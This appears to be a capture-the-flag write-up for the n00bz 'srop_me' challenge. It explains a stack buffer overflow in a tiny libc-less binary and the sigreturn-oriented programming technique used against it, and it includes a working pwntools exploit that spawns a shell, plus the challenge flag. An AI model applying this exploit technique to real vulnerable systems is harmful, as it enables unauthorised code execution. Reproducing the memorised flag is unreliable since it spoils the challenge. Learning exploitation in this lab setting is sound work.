# **ASM**
We are provided with a small binary, there's no linked libc. Due to the very small size of the binary and the absence of libc, there are not enough gadgets to perform a usual rop chain. Instead, as the name of the executable (`srop_me`) suggests, we need to srop.

# SROP ?
So I had to google a bit because I never did SROP before :)

I based myself on https://sharkmoos.medium.com/a-quick-demonstration-of-sigreturn-oriented-programming-d9ae98c3ab0e

This is what you need in your rop chain :
- gadget to set `rax` to `15` (code for `sigreturn`)
- syscall gadget (call sigreturn)
- a fake sigreturn frame that contains the proper registers for execve('/bin/sh')
- syscall gadget (call execve)

`sigreturn` will restore the registers according to the sigreturn frame on the stack, and then execution will proceed at the `rip` (program counter) provided in the frame.



# Executable
What mitigations are in place ?
```
[*] '/home/skuuk/n00bz/srop_me'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```
NX is not actually disabled, this is a bug from checksec :
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00000000400000 0x00000000401000 0x00000000000000 r-- /home/skuuk/n00bz/srop_me
0x00000000401000 0x00000000402000 0x00000000001000 r-x /home/skuuk/n00bz/srop_me
0x00000000402000 0x00000000403000 0x00000000002000 r-- /home/skuuk/n00bz/srop_me
0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]
0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]
0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
```

The executable is so simple we can just look at its disassembly in gdb
```
gef➤  disas _start
Dump of assembler code for function _start:
=> 0x0000000000401038 <+0>:	call   0x401000 <vuln>
   0x000000000040103d <+5>:	mov    eax,0x3c
   0x0000000000401042 <+10>:	mov    edi,0x0
   0x0000000000401047 <+15>:	syscall 
   0x0000000000401049 <+17>:	ret    
End of assembler dump.
gef➤  disas vuln
Dump of assembler code for function vuln:
   0x0000000000401000 <+0>:	mov    eax,0x1
   0x0000000000401005 <+5>:	mov    edi,0x1
   0x000000000040100a <+10>:	movabs rsi,0x402000
   0x0000000000401014 <+20>:	mov    edx,0xf
   0x0000000000401019 <+25>:	syscall 
   0x000000000040101b <+27>:	sub    rsp,0x20
   0x000000000040101f <+31>:	mov    eax,0x0
   0x0000000000401024 <+36>:	mov    edi,0x0
   0x0000000000401029 <+41>:	mov    rsi,rsp
   0x000000000040102c <+44>:	mov    edx,0x200
   0x0000000000401031 <+49>:	syscall 
   0x0000000000401033 <+51>:	add    rsp,0x20
   0x0000000000401037 <+55>:	ret    
End of assembler dump.
gef➤  tele 0x402000
0x00000000402000│+0x0000: "Hello, world!!\n/bin/sh"
0x00000000402008│+0x0008: "orld!!\n/bin/sh"
0x00000000402010│+0x0010: 0x0068732f6e6962 ("bin/sh"?)
0x00000000402018│+0x0018:  add BYTE PTR [rax], al
0x00000000402020│+0x0020:  add BYTE PTR [rax], al
0x00000000402028│+0x0028:  add BYTE PTR [rax], al
0x00000000402030│+0x0030:  add BYTE PTR [rax], al
0x00000000402038│+0x0038: 0x00000000401000  →  <vuln+0> mov eax, 0x1
0x00000000402040│+0x0040:  add BYTE PTR [rax], al
0x00000000402048│+0x0048:  add BYTE PTR [rax], al
gef➤
```
If you don't know, on x86-64 systems :
- the syscall code is stored in `rax`
- 1st, 2nd and 3rd arguments are stored `rdi`,`rsi` and `rdx` respectively
- `eXX` refers to the 4 lower bytes of register `rXX`
- the syscall code for `read` is 0
- the syscall code for `write` is 1

What does the executable do ?
- calls `vuln`
- vuln firsts calls `write(1,"Hello, world!!\n/bin/sh",0xf)` (*note the presence of `/bin/sh\x00` in memory*) to stdout which effectively just writes `"Hello, world!!\n"` (15 bytes)
- vuln then calls `read(0,buff,0x200)` where `buff` is only of size 32 bytes (buffer overflow !)

# Vulnerability

We have a buffer overflow and we can use it to send our srop chain !

There is a small caveat when it comes to the srop chain construction : no `pop rax` gadget, so at first glance there is no way to control rax to ensure we call sigreturn.

However, `read` stores the number of characters read to `rax`. We can thus call `vuln` again and since we control the number of bytes sent, we control the number of bytes read, and effectively `rax`. Think of it as a fancy `pop rax` gadget.

# Exploit
Without all of the pwntools boilerplate from the template :
```python
io = start()

binsh = next(exe.search(b"/bin/sh\x00")) # /bin/sh is present in the binary
syscall_ret = ROP(exe).find_gadget(['syscall', 'ret'])[0] # syscall gadget

frame = SigreturnFrame()
frame.rax = 59          # syscall code for execve
frame.rdi = binsh       # path
frame.rsi = 0           # args
frame.rdx = 0           # env
frame.rip = syscall_ret # syscall gadget to call execve

rop  = p64(exe.symbols['vuln']) # so that we read from stdin and store the number of bytes read to rax
rop += p64(syscall_ret)         # call sigreturn ()
rop += bytes(frame)             # frame used by sigreturn

io.recvuntil("!!\n")
io.sendline(b"a" * 32 + rop)

io.recvuntil("!!\n") # otherwise the second read will fail
io.sendline(b"a"*14) #  15 bytes read -> rax=15 (code for sigreturn) when returning from vuln the 2nd time

io.sendline(b"cat flag")
io.interactive()
```
*you can find my full exploit in `srop.py`*
# FLAG
```
n00bz{SR0P_1$_s0_fun_r1ght??!}
```